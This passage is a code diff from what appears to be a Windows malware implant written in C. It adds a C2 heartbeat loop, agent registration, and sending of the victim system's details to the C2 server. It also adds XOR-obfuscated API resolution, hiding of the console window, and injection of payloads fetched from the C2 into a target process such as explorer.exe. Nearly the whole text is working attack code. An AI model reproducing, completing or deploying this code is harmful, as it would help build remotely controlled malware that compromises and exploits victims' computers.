+    if (send(sock, http_request, strlen(http_request), 0) == SOCKET_ERROR) {
+        DEBUG("[C2 - Heartbeat - Error] Send failed: %d\n", WSAGetLastError());
+        closesocket(sock);
+        WSACleanup();
+        return -1;
+    }
+    DEBUG("[C2 - Heartbeat - Send] Request sent successfully\n");
+
+    // Receive HTTP response
+    char recv_buffer[8192] = {0};
+    int total_received = 0;
+    int bytes_received;
+
+    DEBUG("[C2 - Heartbeat - Receive] Waiting for response...\n");
+    while ((bytes_received = recv(sock, recv_buffer + total_received,
+                                    sizeof(recv_buffer) - total_received - 1, 0)) > 0) {
+        total_received += bytes_received;
+        if (total_received >= sizeof(recv_buffer) - 1) break;
+    }
+
+    if (total_received > 0) {
+        recv_buffer[total_received] = '\0';
+        DEBUG("[C2 - Heartbeat - Receive] Received %d bytes\n", total_received);
+
+        // Find JSON body (after HTTP headers)
+        char* json_body = strstr(recv_buffer, "\r\n\r\n");
+        if (json_body && response_buffer) {
+            json_body += 4; // Skip the \r\n\r\n
+            DEBUG("[C2 - Heartbeat - Response] JSON: %s\n", json_body);
+
+            // Copy to response buffer
+            strncpy(response_buffer, json_body, buffer_size - 1);
+            response_buffer[buffer_size - 1] = '\0';
+        }
+    } else {
+        DEBUG("[C2 - Heartbeat - Warning] No response received\n");
+    }
+
+    // Cleanup
+    closesocket(sock);
+    WSACleanup();
+
+    DEBUG("[C2 - Heartbeat - Success] Heartbeat sent successfully\n");
+    return total_received > 0 ? 0 : -1;
+}
+
+
 
 
 // ============================================================================
@@ -1287,6 +2118,14 @@ int run_sandbox_checks(const SystemInfo* sysInfo) {
 // ============================================================================
 
 int initialize_injection_apis(unsigned char xor_key) {
+    static int initialized = 0;
+
+    // Check if already initialized
+    if (initialized) {
+        DEBUG("[Injection APIs] Already initialized, skipping...\n");
+        return 0;
+    }
+
     DEBUG("[Decryption - Start] Decrypting all API strings (Reverse + XOR)...\n");
 
     decrypt_reverse_xor(encryptedKernel32, sizeof(encryptedKernel32), xor_key);
@@ -1349,6 +2188,9 @@ int initialize_injection_apis(unsigned char xor_key) {
     }
 
     DEBUG("[GetProcAddress - Complete] All API functions resolved successfully\n");
+
+    // Mark as initialized
+    initialized = 1;
     return 0;
 }
 
@@ -1440,6 +2282,13 @@ int perform_injection(const char* process_name, unsigned char* payload, size_t p
 // ============================================================================
 
 int main(void) {
+
+    // Detach from console if debug mode is disabled
+    if (!DEBUG_MODE) {
+        FreeConsole();
+    }
+
+    //unsigned char* xor_process_key = NULL;
     // ------------------------------------------------------------------------
     // INITIALIZATION
     // ------------------------------------------------------------------------
@@ -1486,48 +2335,91 @@ int main(void) {
     // ------------------------------------------------------------------------
     DEBUG("[C2 Registration - Start] Contacting C2 server...\n");
 
-    C2Response c2_response;
+    C2RegistrationResponse c2_response;
     if (register_with_c2(uuid_base64, json_buffer, &c2_response) != 0) {
         DEBUG("[C2 Registration - Error] Failed to register with C2 server\n");
         printf("\nFailed to register with C2. Press Enter to exit...\n");
         getchar();
         return -1;
+    } else {
+        DEBUG("[C2 Registration - Success] Registered with C2 server\n");
+        DEBUG("[C2 Registration - Success] Agent ID: %s\n", c2_response.agent_id);
+        DEBUG("[C2 Registration - Success] XOR Key: %s\n", c2_response.xor_key);
+        //xor_process_key = c2_response.xor_key;
     }
 
-    DEBUG("[C2 Registration - Success] Agent ID: %s\n", c2_response.agent_id);
-    DEBUG("[C2 Registration - Success] Received XOR key for payload decryption\n");
 
 
-    //Agent → {agent_id,archi_pc_infecte_json} → C2
-    DEBUG("[C2 Communication - Architecture sending] Sending architecture to C2 server...\n");
-    send_architecture_to_c2(c2_response.agent_id, json_buffer);
+
+    // ------------------------------------------------------------------------
+    // SEND ARCHITECTURE TO C2
+    // ------------------------------------------------------------------------
+    DEBUG("[C2 Communication - Architecture] Sending complete system info to C2 server...\n");
+    if (send_architecture_to_c2(c2_response.agent_id, &sysInfo) != 0) {
+        DEBUG("[C2 Communication - Architecture - Error] Failed to send architecture to C2\n");
+        printf("\nFailed to send architecture to C2. Press Enter to exit...\n");
+        getchar();
+        return -1;
+    }
 
 
-    /*
+    
     // ------------------------------------------------------------------------
     // INJECTION API INITIALIZATION
     // ------------------------------------------------------------------------
     unsigned char xor_function_key = 0x35;
-    if (initialize_injection_apis(xor_function_key) != 0) {
-        printf("\nFailed to initialize injection APIs. Press Enter to exit...\n");
-        getchar();
-        return -1;
-    }
+    unsigned char xor_process_key = 0x1b;
 
-    // Decrypt process name
-    decrypt_reverse_xor(encryptedexplorer_exe, sizeof(encryptedexplorer_exe), xor_process_key);
-    DEBUG("[Decryption - Complete] Decrypted Explorer.exe string: %s\n", encryptedexplorer_exe);
 
     // ------------------------------------------------------------------------
-    // PERFORM INJECTION
+    // HEARTBEAT LOOP WITH PAYLOAD DETECTION
     // ------------------------------------------------------------------------
-    if (perform_injection((const char*)encryptedexplorer_exe, scBytes, scLength) != 0) {
-        printf("\nInjection failed. Press Enter to exit...\n");
-        getchar();
-        return -1;
+    DEBUG("[Main Loop - Start] Entering heartbeat loop...\n");
+
+    char heartbeat_response[8192];
+    Task current_task;
+
+    while (1)
+    {
+        DEBUG("[Main Loop] Sending heartbeat to C2...\n");
+
+        if (send_heartbeat_to_c2(c2_response.agent_id, heartbeat_response, sizeof(heartbeat_response)) == 0) {
+
+            int payload_result = parse_payload_from_response(heartbeat_response, &current_task, c2_response.xor_key);
+
+            if (payload_result == 1) {
+                DEBUG("[Main Loop - Payload Detected] Payload size: %zu bytes\n", current_task.payload_size);
+                DEBUG("[Main Loop - Payload Detected] Target process: %s\n", current_task.target_process);
+
+                // Execute injection task
+                int exec_result = execute_task(&current_task, xor_function_key, xor_process_key);
+
+                if (exec_result == 0) {
+                    DEBUG("[Main Loop - Injection Completed] Payload injected successfully\n");
+                } else {
+                    DEBUG("[Main Loop - Injection Failed] Injection failed with code %d\n", exec_result);
+                }
+
+                // Clean up payload memory
+                if (current_task.payload) {
+                    free(current_task.payload);
+                    current_task.payload = NULL;
+                }
+            } else if (payload_result == 0) {
+                // No payload (null or empty)
+                DEBUG("[Main Loop] No payload to inject\n");
+            } else {
+                // Parse error
+                DEBUG("[Main Loop - Error] Failed to parse payload from response\n");
+            }
+        } else {
+            DEBUG("[Main Loop - Error] Heartbeat failed\n");
+        }
+
+        // Sleep 5 seconds before next heartbeat
+        Sleep(5000);
     }
-    printf("\nInjection successful. Press Enter to exit...\n");
-    */
+    
     getchar();
     return 0;
 }
